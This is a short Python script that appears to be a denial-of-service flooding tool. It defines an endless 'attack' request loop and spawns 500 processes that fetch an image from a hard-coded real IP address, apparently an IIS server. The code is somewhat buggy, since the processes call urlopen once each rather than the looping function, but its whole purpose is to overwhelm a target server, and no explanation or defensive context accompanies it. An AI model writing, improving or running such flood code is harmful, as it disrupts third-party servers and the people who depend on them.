from urllib.request import urlopen
import multiprocessing, requests

def attack(url):
    while True:
        requests.get(url)
        urlopen(url)
        
        
for i in range(0,500):
    multiprocessing.Process(target=urlopen, args=("http://180.176.210.28/iisstart.png",)).start()
  
